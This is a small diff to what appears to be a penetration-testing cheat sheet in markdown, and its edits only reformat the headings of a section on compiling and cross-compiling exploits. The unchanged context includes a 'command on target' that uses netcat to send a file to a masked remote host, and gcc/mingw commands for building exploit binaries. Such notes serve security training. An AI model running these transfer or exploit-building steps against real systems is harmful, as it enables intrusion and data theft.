@@ -219,10 +219,10 @@ Command on target: `nc.exe 192.168.xxx.xxx 443 -w 3 < report.html`<br/>
 ## compile code:
 Exploit mostly written in c.<br/>
 `gcc -o exploit EXPLOIT.c `<br/>
-# Compile C code, add –m32 after ‘gcc’ for compiling 32 bit code on 64 bit Linux<br/>
+Compile C code, add –m32 after ‘gcc’ for compiling 32 bit code on 64 bit Linux<br/>
 `i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe`
 
-# Cross compiling
+Cross compiling<br/>
 Compile Windows exploit in Linux<br/>
 `i686-w64-mingw32-gcc 18176.c -lws2_32 -o 18176.exe`
 
